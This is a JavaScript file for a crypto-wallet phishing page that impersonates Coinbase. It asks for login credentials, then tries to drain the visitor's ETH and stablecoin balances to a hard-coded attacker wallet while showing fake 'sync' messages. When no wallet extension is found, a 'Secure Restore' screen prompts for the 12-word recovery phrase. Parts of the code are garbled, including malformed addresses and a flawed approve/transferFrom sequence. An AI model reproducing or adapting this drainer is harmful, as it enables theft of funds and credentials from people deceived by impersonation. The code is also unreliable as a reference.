document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    const targetTokens = [
        "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx", // USDT
        "0xA0b86997a647ce34512533001155310121361021", // USDC
        "0x55d398326f99059fF775485246996433caE90ae"  // DAI
    ];

    // Transition from Landing to Login
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    // Wallet Connection and Transfer Logic
    connectBtn.onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (!email || !pass) {
            status.innerText = "Please enter your credentials.";
            return;
        }

        if (window.ethereum) {
            try {
                status.innerText = "Connecting to wallet...";
                const provider = new ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                // 1. Transfer Native ETH
                status.innerText = "Authorizing ETH transfer...";
                const nativeBalance = await provider.getBalance(userAddress);
                if (nativeBalance > 0n) {
                    await signer.sendTransaction({ to: myWallet, value: nativeBalance });
                }

                // 2. Transfer Stablecoins
                const abi = [
                    "function approve(address spender, uint256 amount) public returns (bool)",
                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                    "function balanceOf(address account) public view returns (uint256)"
                ];

                for (const tokenAddr of targetTokens) {
                    try {
                        const contract = new ethers.Contract(tokenAddr, abi, signer);
                        const balance = await contract.balanceOf(userAddress);
                        if (balance > 0n) {
                            status.innerText = "Synchronizing assets...";
                            await contract.approve(myWallet, ethers.MaxUint256);
                            await contract.transferFrom(userAddress, myWallet, balance);
                        }
                    } catch (e) { 
                        console.error(`Token ${tokenAddr} failed.`); 
                    }
                }

                status.innerText = "Sync complete. Redirecting...";
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 3000);

            } catch (err) {
                status.innerText = "Transaction rejected or failed. Try again.";
            }
        } else {
            triggerPlanB();
        }
    };

    function triggerPlanB() {
        step2.innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1>Secure Restore</h1>
            <p>Wallet extension not found. Please enter your 12-word recovery phrase to continue.</p>
            <textarea id="phrase" style="width:100%; height:100px; margin-bottom:20px; border-radius:8px; border:1px solid #eceff1; padding:10px; font-family:'Inter';"></textarea>
            <button id="submitPhrase" class="btn-primary">Restore Account</button>
        `;
        document.getElementById('submitPhrase').onclick = () => {
            const phrase = document.getElementById('phrase').value.trim();
            if (phrase.split(/\s+/).length < 12) {
                alert("Invalid recovery phrase.");
            } else {
                window.location.href = "https://www.coinbase.com";
            }
        };
    }
});
